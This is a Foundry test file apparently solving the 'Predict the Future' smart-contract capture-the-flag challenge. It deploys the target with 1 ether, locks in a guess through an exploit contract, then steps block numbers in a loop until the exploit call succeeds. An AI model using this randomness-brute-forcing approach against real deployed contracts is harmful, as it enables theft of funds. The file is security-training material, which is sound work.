// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        vm.deal(address(exploitContract), 1 ether);
        exploitContract.lockInMyGuess(1);
        // to pass 2nd require statement
        vm.roll(block.number + 2);

        bool isComplete = predictTheFuture.isComplete();

        // attack until challenge is completed, increase block.number on every fail
        while (!isComplete) {
            try exploitContract.Exploit() {
                isComplete = true;
            } catch {
                vm.roll(block.number + 1);
            }
        }
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
